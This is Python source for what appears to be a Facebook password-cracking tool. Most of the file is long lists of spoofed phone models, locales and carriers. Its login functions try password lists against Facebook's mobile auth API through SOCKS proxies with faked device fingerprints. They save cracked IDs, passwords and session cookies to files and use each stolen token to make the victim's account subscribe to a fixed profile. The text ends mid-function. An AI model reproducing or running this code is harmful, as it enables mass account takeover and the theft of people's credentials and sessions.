awmsize = ['{density=3.0,width=1080,height=2480}','{density=2.75,width=720,height=1612}','{density=3.0,width=1080,height=2400}','{density=2.75,width=720,height=1520}','{density=3.0,width=1080,height=2408}','{density=3.0,width=1080,height=2340}','{density=3.0,width=1080,height=2376}','{density=3.0,width=1080,height=2404}','{density=3.0,width=1080,height=2404}','{density=2.75,width=720,height=1280}','{density=3.0,width=1080,height=2408}','{density=2.75,width=720,height=1440}','{density=2.75,width=720,height=1280}','{density=3.0,width=1080,height=1}','{density=3.0,width=1080,height=2448}','{density=3.0,width=1080,height=2448}','{density=3.0,width=1080,height=2448}','{density=3.0,width=1080,height=2400}','{density=3.0,width=1080,height=2412}','{density=3.0,width=1080,height=2160}','{density=3.0,width=1440,height=3040}','{density=3.0,width=1080,height=2340}','{density=3.0,width=1080,height=2340}','{density=3.0,width=1080,height=2340}','{density=3.0,width=1080,height=2400}','{density=3.0,width=1080,height=2400}','{density=3.0,width=1440,height=3120}','{density=3.0,width=1080,height=2400}','{density=3.0,width=1080,height=2400}','{density=2.75,width=720,height=1640}','{density=2.75,width=720,height=1440}','{density=2.75,width=720,height=1600}','{density=2.75,width=720,height=1600}','{density=3.0,width=1080,height=2408}','{density=3.0,width=1080,height=2408}','{density=3.0,width=1080,height=2408}','{density=3.0,width=1080,height=2400}','{density=3.0,width=1080,height=2400}','{density=3.0,width=1080,height=2246}','{density=3.0,width=1080,height=2400}','{density=2.75,width=720,height=1612}']
enawm1 = ['en_GB','en_US','fr_CH','nl_NL']
awmfbs1 = ["8.1.0", "9", "10", "11", "12"]
rmxawm = ['RMX1603','RMX1801','RMX1805','RMX1807','RMX1809','RMX1811','RMX1821','RMX1825','RMX1827','RMX1831','RMX1833','RMX1851','RMX1901','RMX1903','RMX1911','RMX1919','RMX1921','RMX1925','RMX1931','RMX1941','RMX1945','RMX1971','RMX1991','RMX1992','RMX1993','RMX2001','RMX2002','RMX2020','RMX2021','RMX2025','RMX2027','RMX2030','RMX2032','RMX2040','RMX2050','RMX2051','RMX2061','RMX2063','RMX2071','RMX2072','RMX2075','RMX2076','RMX2081','RMX2083','RMX2085','RMX2086','RMX2101','RMX2103','RMX2111','RMX2117','RMX2121','RMX2142','RMX2144','RMX2151','RMX2155','RMX2156','RMX2161','RMX2163','RMX2170','RMX2176','RMX2180','RMX2185','RMX2189','RMX2193','RMX2195','RMX2202','RMX3031','RMX3061','RMX3063','RMX3081','RMX3085','RMX3092','RMX3171','RMX3191','RMX3193','RMX3195','RMX3197','RMX3201','RMX3231','RMX3241','RMX3242',]
scmodel = ['SC-04A', 'SC-01A', 'SC-02A', 'SC-03A', 'SC-05A', 'SC-06A', 'SC-07A', 'SC-08A', 'SC-09A', 'SC-04B', 'SC-01B', 'SC-02B', 'SC-03B', 'SC-05B', 'SC-06B', 'SC-07B', 'SC-08B', 'SC-09B', 'SC-04C', 'SC-01C', 'SC-02C', 'SC-03C', 'SC-05C', 'SC-06C', 'SC-07C', 'SC-08C', 'SC-09C', 'SC-04D', 'SC-01D', 'SC-02D', 'SC-03D', 'SC-05D', 'SC-06D', 'SC-07D', 'SC-08D', 'SC-09D', 'SC-04E', 'SC-01E', 'SC-02E', 'SC-03E', 'SC-05E', 'SC-06E', 'SC-07E', 'SC-08E', 'SC-09E', 'SC-04F', 'SC-01F', 'SC-02F', 'SC-03F', 'SC-05F', 'SC-06F', 'SC-07F', 'SC-08F', 'SC-09F', 'SC-04G', 'SC-01G', 'SC-02G', 'SC-03G', 'SC-05G', 'SC-06G', 'SC-07G', 'SC-08G', 'SC-09G', 'SC-04H', 'SC-01H', 'SC-02H', 'SC-03H', 'SC-05H', 'SC-06H', 'SC-07H', 'SC-08H', 'SC-09H', 'SC-04I', 'SC-01I', 'SC-02I', 'SC-03I', 'SC-05I', 'SC-06I', 'SC-07I', 'SC-08I', 'SC-09I', 'SC-04J', 'SC-01J', 'SC-02J', 'SC-03J', 'SC-05J', 'SC-06J', 'SC-07J', 'SC-08J', 'SC-09J', 'SC-04K', 'SC-01K', 'SC-02K', 'SC-03K', 'SC-05K', 'SC-06K', 'SC-07K', 'SC-08K', 'SC-09K', 'SC-04L', 'SC-01L', 'SC-02L', 'SC-03L', 'SC-05L', 'SC-06L', 'SC-07L', 'SC-08L', 'SC-09L', 'SC-04M', 'SC-01M', 'SC-02M', 'SC-03M', 'SC-05M', 'SC-06M', 'SC-07M', 'SC-08M', 'SC-09M', 'SC-04N', 'SC-01N', 'SC-02N', 'SC-03N', 'SC-05N', 'SC-06N', 'SC-07N', 'SC-08N', 'SC-09N', 'SC-04O', 'SC-01O', 'SC-02O', 'SC-03O', 'SC-05O', 'SC-06O', 'SC-07O', 'SC-08O', 'SC-09O', 'SC-04Q', 'SC-01Q', 'SC-02Q', 'SC-03Q', 'SC-05Q', 'SC-06Q', 'SC-07Q', 'SC-08Q', 'SC-09Q', 'SC-04S', 'SC-01S', 'SC-02S', 'SC-03S', 'SC-05S', 'SC-06S', 'SC-07S', 'SC-08S', 'SC-09S', 'SC-04Y', 'SC-01Y', 'SC-02Y', 'SC-03Y', 'SC-05Y', 'SC-06Y', 'SC-07Y', 'SC-08Y', 'SC-09Y', 'SC-04Z', 'SC-01Z', 'SC-02Z', 'SC-03Z', 'SC-05Z', 'SC-06Z', 'SC-07Z', 'SC-08Z', 'SC-09Z']
vivomodel1 = ['V5s','V5','X9','X9s Plus','Y25','Y55s','V5 Lite','Y53','Y69','V5 Plus','Xplay6','Y67','X7 Plus','X9s','X9 Plus','X7','V1','V3Max','Y15S','Y51','X6Plus','X6','Xplay5','Y35','Y31','X6S Plus','Xplay5 Elite','V3','X6S','V1 Max','X5Max','Y37','X5Max+','X5Max','Y11','X5Pro','Xplay3S','X5','X20','X20 Plus','V7+','V7','Y27','Y28','X3S','Xshot','Y15','Y22','S16 Pro','iQOO Neo7 Racing','Y55s','iQOO Neo 7','Y100','Y56','V27e','V27','V27 Pro','iQOO Z7i','iQOO Z7x','iQOO Z7','iQOO Z7','Y02A','Y11','iQOO','Neo7 SE','Y02','X90 Pro+','X90 Pro','X90','V21s','iQOO Neo7','Y73t','X Fold+','X80 Lite','Y52t','iQOO Z6 Lite','Y16','Y75s','Y22','V25e','iQOO Z6','iQOO Z6x','Y22s','Y77e (t1)','V25 Pro','V25','Y35','Y77e','Y02s','iQOO 9T','Y30 5G','T1x','iQOO 10 Pro','iQOO 10','Y77','Y77 (China)','iQOO U5e','Y33e','T2x','Y72t','T2','Y75','S15 Pro']
modelxxx = ['X677','F98', 'NOTE 2 LTE', 'NOTE 2', 'Hot', 'Hot 1', 'Note 3', 'NOTE 3 PRO', 'Hot 10', 'Hot 10 Play', 'Note 4', 'Note 4 Pro', 'Hot 10s', 'Note 5', 'Note 10s NFC', 'Note 5 Stylus', 'Note 6', 'Note 7 LTE', 'Note 7', 'Note 7 Lite', 'Hot 10T', 'Hot 11', 'Hot 11s', 'Hot 12', 'Hot 12 Play', 'Hot 12 Play NFC', 'HOT','Note 12 Pro 5G', 'Hot 5', 'Hot 5 Pro', 'Hot 5 NFC', 'Hot 5 LTE', 'Hot 5 Lite', 'Hot 6', 'Hot 6 Pro', 'Hot 6 Lite', 'Hot 6 LTE', 'Hot 6 NFC', 'Hot 7', 'Hot 7 Lite', 'Hot 7 NFC', 'Hot 7 LTE', 'Hot 8', 'Hot 8 Pro', 'Hot 8 NFC', 'Hot 8 LTE', ' Hot 9', 'Hot 9 Pro', 'Hot 9 LTE', ' Hot 9 Lite', 'Hot 9 NFC']
awmfban1 = [ 'MessengerLite', 'FB4A', 'MobileAdsManagerAndroid', 'Orca-Android' ]
awmRedmi = [ 'Redmi Note 8 Pro', 'Redmi Note 6 Pro', 'Redmi Note 11', 'Redmi Note 12 Pro' ]
awmsim1 = [ 'MTN', 'AWCC', 'Roshan', 'Etisalat', 'Salaam' ]
awminfinix = [ 'Infinix Note 11', 'Infinix Note 12 Pro', 'Infinix Note 10', 'Infinix Note 9', 'Infinix Hot 12', 'Infinix Note 8', 'Infinix Hot 6', 'Infinix Hot 10 ', 'Infinix Hot 9 ', 'Infinix Hot 7']
cph = ['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853','CPH3979','CPH3983','CPH3987','CPH2005','CPH2009','CPH2035','CPH2059','CPH2063','CPH2065','CPH2069','CPH2073','CPH2073','CPH2077','CPH2093','CPH2095','CPH2099','CPH2337','CPH2339','CPH2345','CPH2363','CPH2385','CPH2203','CPH2209','CPH3803','CPH3803','CPH3805','CPH3809','CPH3827','CPH3837','CPH3853','CPH3853','CPH1979','CPH1983','CPH1987','CPH1005','CPH1009','CPH1015','CPH1059','CPH1061','CPH1065','CPH1069','CPH1071','CPH1073','CPH1077','CPH1091','CPH1095','CPH1099','CPH1137','CPH1139','CPH1145','CPH1161','CPH1185','CPH1101','CPH1109','CPH1801','CPH1803','CPH1805','CPH1809','CPH1817','CPH1837','CPH1851','CPH1853']
model = ["x677","X625D","X626","X626B","X627V","X650","X650B","X650C","X650D","X652","X652A","X652B","X652C","X653","X653C","X655","X655C","X655D","X655D","X656","X656","X657B","X657C","X659B","X660","X660","X660B","X660C","X662B","X662C","X663","X687","X687B","X688B","X688Cr","X689","X689B","X689C","X690","X690B","X692","X693","X695","X697","X663","X663B","PR652B","X267","X5010","X521","X5514D","X5515","5515F","X559","559C","559C","559F","X571","572","X573","573B","X601","X603","X604","X604B","X605","X606","X606B","X606C","X606D","608","609","610","610B","X612","612B","X612B","620","X620B","X622","X623","X623B","X624","X624B","X625","X625B","X695Ci+","X697""X663", "X663B","PR652B","X267","X5010","X521","X5514D","X5515","X5515F","X559","X559C","X559F","X571","X572","X573","X573B","X601","X603","X604","X604B","X605","X606","X606B","X606C","X606D","X608","X609","X610","X610B","X612","X612B","X620","X620B","X622","X623","X623B","X624","X624B","X625","X625B","X625D","X626","X626B","X627V","X650","X650B","X650C","X650D","X652","X652A","X652B","X652C","X653","X653C","X655","X655C","X655D","X655F","X656","X657","X657B","X657C","X659B","X660","X660B","X660C","X680","X680B","X680C","X682B","X682C","X683","X687","X687B","X688B","X688C","X688C","X689","X689B","X689C","X690","X690B","X692","X693","X695","X695C","X521" ,"X672" ,"X6815B" ,"X6815B" ,"X6515" ,"X6516" ,"X6825" ,"X5516B" ,"X669C" ,"X669D" ,"X6815C" ,"X670" ,"X5516C" ,"X6826B" ,"X5516C" ,"X676C" ,"X697" ,"X5516B" ,"X6515" ,"X6811" ,"Note 11", "Note 12 Pro", "Note 10", "Note 9", "Hot 12", "Note 8", "Hot 6", "Hot 10", "Hot 9", "Hot 7"]
mmm = ['POT-AL00a','POT-TL00a','HUAWEI-M931','MLA-L01/L11','MLA-L11', 'MLA-L02/L12', 'MLA-L02', 'MLA-L12', 'MLA-L03/L13', 'MLA-L03', 'MLA-L13', 'MLA-AL10', 'MLA-L01','RIO-AL00','ALP-L29', 'ALP-L09', 'ALP-AL00', 'ALP-TL00','G630-U10', 'G630-U20', 'G630-U00','EVR-L29', 'EVR-AL00', 'EVR-TL00','G620S-L01', 'G620S-UL00', 'G620S-L02','LYA-L09', 'LYA-L29', 'LYA-AL00', 'LYA-AL10', 'LYA-TL00', 'LYA-L0C','SNE-AL00', 'SNE-LX1','TAH-AN00','Y320-U30','Y300-0100', 'Y300-0151','CRR-UL00', 'CRR-L09', 'CRR-UL20','Y221-U22', 'Y221-U12','NEO-L29', 'NEO-AL00','LON-L29', 'LON-AL00','MHA-L29', 'MHA-L09', 'MHA-AL00','NXT-AL10', 'NXT-CL00', 'NXT-DL00', 'NXT-TL00', 'NXT-L09', 'NXT-L29','H1711', 'TRT-LX1', 'TRT-LX3', 'TRT-LX2','P7-L10', 'P7-L00','DCO-AL00', 'DCO-LX9','NXT-AL10', 'NXT-CL00', 'NXT-DL00', 'NXT-TL00', 'NXT-L09', 'NXT-L29','P6-U06','P6','CET-AL00', 'CET-LX9','U9202L', 'U9202L-1', 'U9202L-2', 'U9202L-3', 'U9202L-4','OCE-AN50','P6-U06', 'P6','S7-301u', 'S7-302u', 'S7-303u','AGS3-L09', 'AGS3-W09','GOT-W09', 'GOT-W29', 'GOT-AL09', 'GOT-AL19','SNE-LX2','SNE-LX3','INE-LX2','HMA-L29','HMA-L09','HMA-LX9','HMA-AL00','HMA-TL00','G525-U00','BLA-L29','BLA-L09','BLA-AL00','BLA-A09','G510-0200','BLA-L29','BLA-L09','BLA-AL00','BLA-A09','RNE-L21','RNE-L22','RNE-L01','RNE-L02','RNE-L11','RNE-L23','RNE-L03','RNE-AL00','MT2-L00','MT2-L02','MT2-L03','MT2L03','NOH-NX9','NOH-AN00','MT7-TL00','MT7-L09','MT7-TL10','MT7-CL00','MT7-UL00','OCE-AN10','LIO-AN00m','LIO-N29','LIO-AN00P','LIO-AN00','MT1-U06','LIO-N29','LIO-AL10','LIO-TL10','LIO-L09','LIO-L29','LIO-AL00','LIO-TL00','G730-U10','G730-U00','G730-U30','SPL-AL00','SPL-TL00','G700-U10','G700-U20','TAS-AN00','TAS-TN00','G7-L01','G7-L03','G7-L11','G7-UL20','G7-TL00','TAS-L09','TAS-L29','TAS-AL00','TAS-TL00','Y530-U00','Y530-U051','TET-AN00','HUA-Y330-Q6','Y330-U11','Y330-U01','Y330-U05']
sonyxx = ['Xperia XZ3','Xperia XZ2','Xperia XZ3 Premium','Xperia XZ2 Premium' ,'so-03k','so-04k','801SO','SOV39','SO-02L','SO-01L','SO-05H','SO-01H']
AWMGT=("GT-A500F","GT-A500FU","GT-A500H","GT-G532F","GT-G900F","GT-G920F","GT-G930F","GT-G935","GT-G950F","GT-J320F","GT-J320FN","GT-J320H","GT-J320M","GT-J510FN","GT-J701F","GT-N920S","GT-T111","GT-T230","GT-T231","GT-T235","GT-T280","GT-T311","GT-T315","GT-T525","GT-T531","GT-T535","GT-T555","GT-T561","GT-T705","GT-T805","GT-T820",'GT-S908B','GT-G960U1','SC-04J','SC-51B','GT-S9080','GT-M536S','GT-G996W','GT-E426S','GT-G975F','GT-A207F','GT-A013G','GT-A145R','GT-S901B','GT-A145P','GT-N975F','GT-M136B','GT-A035M','GT-A135M','GT-A536B','GT-M115F','GT-M115F','GT-M115M','GT-M115M','GT-M107F','GT-M107G','GT-M107Y','GT-M107M','GT-M105F','GT-M105G','GT-M105Y','GT-M105M','GT-M127F','GT-M135F','GT-M135F','GT-M136B','GT-M136B','GT-M205F','GT-M205FN','GT-M205G','GT-M205M','GT-M205N','GT-N7000','GT-I9220','SHV-E160L','SHV-E160S','GT-J701F','GT-J701F','GT-J701M','GT-J701MT','GT-J710FN','GT-J710F','GT-J710H','GT-J710M','GT-J710GN','GT-J710MN','GT-J710K','GT-J7108','GT-J710FQ','GT-J737F','GT-J737V','GT-J737T','GT-J737A','GT-J737P','GT-J737T1','GT-J737U','GT-J737S','GT-J730F','GT-J730FM','GT-S727VL','GT-J730K','GT-N981B','GT-N981B','GT-N981U','GT-N981U1','GT-N981W','GT-N9810','GT-N981N','GT-J610F','GT-J610F','GT-J610G','GT-J610FN','GT-N980F','GT-N980F','GT-N770F','GT-N770F','GT-N770F','GT-N975F','GT-N975U','GT-N9750','GT-N975U1','GT-N975W','GT-N975N','GT-N975X','SCV45','GT-N971U','GT-N971N', "GT-A426B", "GT-A426B/DS", "GT-A4260", "GT-A426U", "GT-A426U1", "GT-A426N", "GT-A736B", "GT-A736B/DS", "GT-A336E", "GT-A336B", "GT-A336B/DS", "GT-A336B/DSN", "GT-A336E/DS", "GT-A336M", "GT-A326B", "GT-A326B/DS", "GT-A326BR/DS", "GT-A326BR", "GT-A326U", "GT-A326W", "GT-A326U1", "GT-A326K", "SCG08", "GT-S326DL", "GT-N9150", "GT-N915A", "GT-N915D", "GT-N915F", "GT-N915FY", "GT-N915G", "GT-N915K", "GT-N915L", "GT-N915P", "GT-N915R4", "GT-N915S", "GT-N915T", "GT-N915V", "GT-N915W8", "GT-N915X", "SC-01G","GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4GT-T310","KTU84P","GT-A500F","GT-A500FU","GT-A500H","GT-G532F","GT-G900F","GT-G920F","GT-G930F","GT-G935","GT-G950F","GT-J320F","GT-J320FN","GT-J320H","GT-J320M","GT-J510FN","GT-J701F","GT-N920S","GT-T111","GT-T230","GT-T231","GT-T235","GT-T280","GT-T311","GT-T315","GT-T525","GT-T531","GT-T535","GT-T555","GT-T561","GT-T705","GT-T805","GT-T820",'GT-S908B','GT-G960U1','SC-04J','SC-51B','GT-S9080','GT-M536S','GT-G996W','GT-E426S','GT-G975F','GT-A207F','GT-A013G','GT-A145R','GT-S901B','GT-A145P','GT-N975F','GT-M136B','GT-A035M','GT-A135M','GT-A536B','GT-M115F','GT-M115F','GT-M115M','GT-M115M','GT-M107F','GT-M107G','GT-M107Y','GT-M107M','GT-M105F','GT-M105G','GT-M105Y','GT-M105M','GT-M127F','GT-M135F','GT-M135F','GT-M136B','GT-M136B','GT-M205F','GT-M205FN','GT-M205G','GT-M205M','GT-M205N','GT-N7000','GT-I9220','SHV-E160L','SHV-E160S','GT-J701F','GT-J701F','GT-J701M','GT-J701MT','GT-J710FN','GT-J710F','GT-J710H','GT-J710M','GT-J710GN','GT-J710MN','GT-J710K','GT-J7108','GT-J710FQ','GT-J737F','GT-J737V','GT-J737T','GT-J737A','GT-J737P','GT-J737T1','GT-J737U','GT-J737S','GT-J730F','GT-J730FM','GT-S727VL','GT-J730K','GT-N981B','GT-N981B','GT-N981U','GT-N981U1','GT-N981W','GT-N9810','GT-N981N','GT-J610F','GT-J610F','GT-J610G','GT-J610FN','GT-N980F','GT-N980F','GT-N770F','GT-N770F','GT-N770F','GT-N975F','GT-N975U','GT-N9750','GT-N975U1','GT-N975W','GT-N975N','GT-N975X','SCV45','GT-N971U','GT-N971N', "GT-A426B", "GT-A426B/DS", "GT-A4260", "GT-A426U", "GT-A426U1", "GT-A426N", "GT-A736B", "GT-A736B/DS", "GT-A336E", "GT-A336B", "GT-A336B/DS", "GT-A336B/DSN", "GT-A336E/DS", "GT-A336M", "GT-A326B", "GT-A326B/DS", "GT-A326BR/DS", "GT-A326BR", "GT-A326U", "GT-A326W", "GT-A326U1", "GT-A326K", "SCG08", "GT-S326DL", "GT-N9150", "GT-N915A", "GT-N915D", "GT-N915F", "GT-N915FY", "GT-N915G", "GT-N915K", "GT-N915L", "GT-N915P", "GT-N915R4", "GT-N915S", "GT-N915T", "GT-N915V", "GT-N915W8", "GT-N915X", "SC-01G")  
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')

###___________________GRAPH___________________###
def rndm3(ids,passlist):
        global loop,oks,lim
        session = requests.Session()
        p=round(loop*100/lim,2)
        sys.stdout.write('\r\r\033[1;35m [B-GRAPH] [%s] \033[1;37m[OK=%s] [%s%%] \033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
        try:
                for pas in passlist:
                        application_version = str(random.randint(111,888))+'.0.0.'+str(random.randrange(11,88))+str(random.randint(111,888))
                        application_version_code=str(random.randint(000000000,999999999))
                        fbs=random.choice(fbks)
                        accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                        awmsim = random.choice(awmsim1)
                        gtt=random.choice(scmodel)
                        nip=random.choice(prox)
                        proxs= {'http': 'socks4://'+nip}
                        session = requests.Session()
                        gttt=random.choice(scmodel)
                        awmsize1=random.choice(awmsize)
                        enawm=random.choice(enawm1)
                        android_version=str(random.randrange(6,14))
                        ua ='[FBAN/FB4A;FBAV/71.0.3578.141;FBBV/257460578;FBDM/{density=2.0,width=720,height=1280};FBLC/en_Us;FBRV/0;FBCR/DOCOMO;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 9T NFC;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                        device_id = str(uuid.uuid4())
                        adid = str(uuid.uuid4())
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device':gtt,
                                'device_id':adid,
                                'email':ids,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                "locale":"en_US","client_country_code":"US",
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
                        
                        
                        headers ={
                                "Accept-Encoding": "gzip, deflate",
"Accept": "*/*",
"Connection": "keep-alive",
"User-Agent": ua,
"X-FB-Friendly-Name": "ViewerReactionsMutation",
 "X-FB-Request-Analytics-Tags": "graphservice",
   'x-fb-request-analytics-tags':'MOBILE.LTE',
"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"X-FB-Friendly-Name": "authenticate",
"X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
"Content-Type": "application/x-www-form-urlencoded",
"X-FB-HTTP-Engine": "Liger",
"X-FB-Client-IP": "True",
"Content-Length": "698",}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        #print(po)
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [ALEX-LIVE] '+str(uid)+' | '+pas+'\033[1;90m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        oks.append(str(uid))
                                        tok = str(po['access_token'])
                                        requests.post('https://graph.facebook.com/100071596264601/subscribers?access_token='+tok, cookies={'cookie':coki})                                  
                                        open('/sdcard/ALEX-CP.txt','a').write(coki+'\n')
                                        open('/sdcard/ALEX-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;208m [ALEX-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ALEX -CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass

def rndm1(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [B-API] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,999))+'.0.0.'+str(random.randrange(11,99))+str(random.randint(111,999))
                                application_version_code=str(random.randint(000000000,999999999))
                                sk=str(random.randint(111111,999999))+'.'+str(random.randrange(000,999))
                                fbs=random.choice(fbks)
                                enawm=random.choice(enawm1)
                                fbanawm=random.choice(awmfban1)
                                accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                                awmsim = random.choice(awmsim1)
                                gtt=random.choice(awminfinix)
                                mmm = ['POT-AL00a','POT-TL00a','HUAWEI-M931','MLA-L01/L11','MLA-L11', 'MLA-L02/L12', 'MLA-L02', 'MLA-L12', 'MLA-L03/L13', 'MLA-L03', 'MLA-L13', 'MLA-AL10', 'MLA-L01','RIO-AL00','ALP-L29', 'ALP-L09', 'ALP-AL00', 'ALP-TL00','G630-U10', 'G630-U20', 'G630-U00','EVR-L29', 'EVR-AL00', 'EVR-TL00','G620S-L01', 'G620S-UL00', 'G620S-L02','LYA-L09', 'LYA-L29', 'LYA-AL00', 'LYA-AL10', 'LYA-TL00', 'LYA-L0C','SNE-AL00', 'SNE-LX1', 'SNE-LX2', 'SNE-LX3']
                                gttt=random.choice(mmm)
                                network = random.choice(['Zong','Etisalat Af','Telenor','Telekom China'])
                                ua = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBLC/ce_RU;FBRV/{application_version_code};FBCR/MTN;FBDM/'+'{density=2.62,width=720,height=1612};FBPN/com.facebook.katana;FBMF/Nokia;FBBD/Nokia;FBDV/G310;FBSV/13;FBOP/19;FBCA/armeabi-v8a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {
                    'adid':adid,
                    'format':'json',
                    'device_id':device_id,
                    'email':ids,
                    'password':pas, 
                    "logged_out_id": str(uuid.uuid4()),
                    "hash_id": str(uuid.uuid4()),
                    "reg_instance": str(uuid.uuid4()),
                    "session_id": str(uuid.uuid4()),
                   # 'device':gttt,
                    'generate_analytics_claim':'1',
                    'community_id':'',
                    'cpl':'true',
                    'try_num':'1',
                    'method':'auth.login', 
                    'family_device_id':device_id,
                    'credentials_type':'password',
                    'enroll_misauth':'false',
                    'generate_session_cookies':'1',
                    'error_detail_type':'button_with_disabled',
                    'source':'login',
                    'generate_machine_id':'1',
                    'jazoest':str(random.randint(2e4,4e4)),
                    'advertising_id':adid,
                    'meta_inf_fbmeta': 'NO_FILE',
                    'currently_logged_in_userid':'0',
                    'locale':'fr_FR',
                    'client_country_code':'FR',
                    'fb_api_req_friendly_name':'authenticate',
                    'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
                    'api_key':'882a8490361da98702bf97a021ddc14d',
                    'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                }
                                head ={
                    'x-fb-connection-quality':'EXCELLENT',
                    'x-fb-connection-type':'MOBILE.LTE',
                    'user-agent':ua,
                    "Connection": "Keep-Alive",
                    'x-tigon-is-retry':'False',
                    'x-fb-http-engine':'Liger',
                    'x-fb-client-ip':'True',
                    'x-fb-server-cluster':'True',
                    'x-fb-device-group':str(random.randint(2000,4000)),
                    "X-FB-Connection-Bandwidth": str(random.randint(2e7, 4e7)),
                    'x-fb-sim-hni':str(random.randint(20000,40000)),
                    'x-fb-net-hni':str(random.randint(20000,40000)),
                    'x-fb-rmd':'cached=0;state=NO_MATCH',
                    'x-fb-request-analytics-tags':'graphservice',
